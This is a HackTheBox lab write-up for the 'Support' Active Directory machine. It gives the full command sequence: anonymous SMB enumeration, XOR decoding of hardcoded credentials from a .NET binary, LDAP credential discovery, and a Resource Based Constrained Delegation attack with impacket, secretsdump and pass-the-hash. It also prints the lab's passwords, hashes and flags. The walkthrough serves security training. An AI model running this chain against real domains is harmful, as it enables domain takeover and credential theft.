# HTB — Support

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9FEF00?style=flat-square&logo=hackthebox&logoColor=black)
![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
![Techniques](https://img.shields.io/badge/Techniques-LDAP%20Enum%20%7C%20.NET%20RE%20%7C%20RBCD-blueviolet?style=flat-square)

---

## Summary

Support is a Windows Active Directory machine that simulates a realistic misconfiguration chain starting from an anonymously accessible SMB share. A custom .NET application found on the share contains hardcoded LDAP credentials obfuscated with a XOR cipher. Authenticated LDAP enumeration reveals a plaintext password stored in a user object's `info` field. BloodHound reveals that this user's group membership grants GenericAll over the Domain Controller computer object, enabling a Resource Based Constrained Delegation (RBCD) attack that results in full domain compromise.

---

## Machine Info

| Field | Details |
|---|---|
| IP | 10.129.230.181 |
| Domain | support.htb |
| DC Hostname | DC |
| FQDN | dc.support.htb |
| OS | Windows Server |
| User Flag | `84ccc82f8d13bdbfdff6f112afaed7d5` |
| Root Flag | `dae3032d7cfca5f9581705d2ca9dc3e9` |

---

## Attack Path Overview

```
Anonymous SMB
     |
     | support-tools share
     v
UserInfo.exe (custom .NET binary)
     |
     | monodis decompile + XOR decode
     v
support\ldap credentials
     |
     | authenticated LDAP dump
     v
support user password (info field)
     |
     | evil-winrm
     v
WinRM shell + user flag
     |
     | BloodHound
     v
Shared Support Accounts → GenericAll → DC$
     |
     | RBCD attack
     v
Forged Administrator Kerberos ticket
     |
     | secretsdump + Pass-the-Hash
     v
Domain Admin + root flag
```

---

## Enumeration

### Port Scanning

**Phase A — Wide coverage:**
```bash
nmap -p- --min-rate 1000 -oN support-all-ports.txt 10.129.230.181
```

**Phase B — Deep identification:**
```bash
nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49676,49681,49704,49742 --min-rate 1000 -oN support-service-scan.txt 10.129.230.181
```

**Key findings:**

| Port | Service | Significance |
|---|---|---|
| 88 | Kerberos | Confirms Domain Controller |
| 389/636/3268/3269 | LDAP/LDAPS/GC | LDAP enumeration target |
| 445 | SMB | Anonymous share enumeration |
| 5985 | WinRM | Shell delivery once creds obtained |

Additional findings from nmap scripts:
- Domain: `support.htb`
- Hostname: `DC`
- SMB signing required — NTLM relay attacks blocked
- Clock skew: 9 seconds — Kerberos attacks safe

```bash
echo "10.129.230.181 support.htb dc.support.htb" | sudo tee -a /etc/hosts
```

### SMB Enumeration

```bash
smbclient -L //10.129.230.181 -N
```

Non-standard share identified: `support-tools`. All other shares are default Windows shares.

```bash
smbclient //10.129.230.181/support-tools -N
ls
```

Contents:
- 7-ZipPortable, Notepad++, PuTTY, SysinternalsSuite, Wireshark — all public software
- `UserInfo.exe.zip` — custom application, uploaded a month after everything else

```bash
get UserInfo.exe.zip
exit
unzip UserInfo.exe.zip
```

---

## Foothold

### UserInfo.exe Reverse Engineering

Initial strings analysis:
```bash
strings UserInfo.exe | grep -iE "pass|ldap|support|key|secret|admin|encrypt"
```

Output confirmed: `getPassword`, `enc_password`, `LdapQuery`, `FromBase64String` — a base64 encoded password being decoded at runtime for LDAP authentication.

Decompile the .NET assembly using monodis:
```bash
monodis --output=UserInfo.il UserInfo.exe
grep -A 30 "getPassword\|enc_password" UserInfo.il
```

The IL reveals:
- `enc_password` = `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`
- `key` = ASCII bytes of `armando`
- Decryption logic: base64 decode, XOR with cycling key, XOR with `0xDF` (223)
- LDAP account: `support\ldap`

Decode the password:
```python
python3 -c "
import base64
enc = '0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E'
key = b'armando'
data = base64.b64decode(enc)
result = bytes([data[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(data))])
print(result.decode())
"
```

**Result:** `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

### Authenticated LDAP Enumeration

```bash
ldapsearch -x -H ldap://10.129.230.181 -D "support\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" > ldap-dump.txt
grep -iE "info:|description:|comment:" ldap-dump.txt
```

Finding at the bottom of output:
```
info: Ironside47pleasure40Watchful
```

Identify the owner:
```bash
grep -B 20 "Ironside47pleasure40Watchful" ldap-dump.txt | grep "^dn:\|^sAMAccountName:"
```

**Result:** `dn: CN=support,CN=Users,DC=support,DC=htb`

Credentials: `support` / `Ironside47pleasure40Watchful`

### WinRM Shell

```bash
evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```

```powershell
type C:\Users\support\Desktop\user.txt
```

**User flag:** `84ccc82f8d13bdbfdff6f112afaed7d5`

---

## Privilege Escalation

### BloodHound Collection

```bash
bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -d support.htb -dc dc.support.htb -ns 10.129.230.181 -c all
```

**Attack path discovered:**

```
SUPPORT@SUPPORT.HTB
    MemberOf
SHARED SUPPORT ACCOUNTS@SUPPORT.HTB
    GenericAll
DC.SUPPORT.HTB
```

GenericAll over the DC computer object enables a Resource Based Constrained Delegation (RBCD) attack.

### RBCD Attack

**Step 1 — Create a fake computer account:**
```bash
impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' \
  -computer-name 'FAKE01$' \
  -computer-pass 'FakePass123!' \
  -dc-ip 10.129.230.181
```

This works because `ms-DS-MachineAccountQuota` defaults to 10, allowing any authenticated user to add computer accounts.

**Step 2 — Write RBCD delegation attribute:**
```bash
impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' \
  -action write \
  -delegate-to 'DC$' \
  -delegate-from 'FAKE01$' \
  -dc-ip 10.129.230.181
```

Writes `FAKE01$` into `msDS-AllowedToActOnBehalfOfOtherIdentity` on the DC object, granting it delegation rights.

**Step 3 — Request Administrator service ticket via S4U:**
```bash
impacket-getST support.htb/FAKE01$:'FakePass123!' \
  -spn cifs/dc.support.htb \
  -impersonate Administrator \
  -dc-ip 10.129.230.181
```

**Step 4 — Use ticket to dump all domain hashes:**
```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-secretsdump support.htb/Administrator@dc.support.htb -k -no-pass -dc-ip 10.129.230.181
```

**Administrator NTLM:** `bb06cbc02b39abeddd1335bc30b19e26`

### Pass-the-Hash

```bash
evil-winrm -i 10.129.230.181 -u Administrator -H bb06cbc02b39abeddd1335bc30b19e26
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**Root flag:** `dae3032d7cfca5f9581705d2ca9dc3e9`

---

## Vulnerabilities

| Vulnerability | Location | Impact |
|---|---|---|
| Hardcoded credentials in binary | UserInfo.exe | LDAP credential exposure |
| Credential stored in LDAP info field | support user object | Domain user compromise |
| GenericAll via group membership | Shared Support Accounts | Full DC computer object control |
| ms-DS-MachineAccountQuota > 0 | Domain | Unauthorised computer account creation |
| RBCD misconfiguration | DC$ | Full domain compromise |

---

## Tools

| Tool | Purpose |
|---|---|
| nmap | Port and service scanning |
| smbclient | Anonymous SMB enumeration |
| ldapsearch | LDAP enumeration |
| monodis | .NET IL decompilation |
| Python3 | XOR credential decoding |
| evil-winrm | WinRM shell |
| bloodhound-python | AD attack path collection |
| impacket-addcomputer | Fake computer account creation |
| impacket-rbcd | RBCD delegation write |
| impacket-getST | Kerberos S4U ticket request |
| impacket-secretsdump | Domain hash dump |

---

## Key Takeaways

1. Non-standard SMB shares always warrant full investigation regardless of their apparent purpose.
2. Custom binaries on file shares are high-value targets for credential extraction via reverse engineering.
3. LDAP user attribute fields (info, description, comment) are common hiding spots for plaintext credentials.
4. BloodHound group membership paths are as important as direct privilege edges.
5. GenericAll over a computer object combined with MachineAccountQuota greater than 0 enables RBCD without touching the target machine.
6. The RBCD attack chain is four commands: addcomputer, rbcd write, getST, secretsdump.

---

## References

- [Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
- [impacket-getST documentation](https://github.com/fortra/impacket)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

---

*by mavhezha | github.com/mavhezha | mavhezha.com*
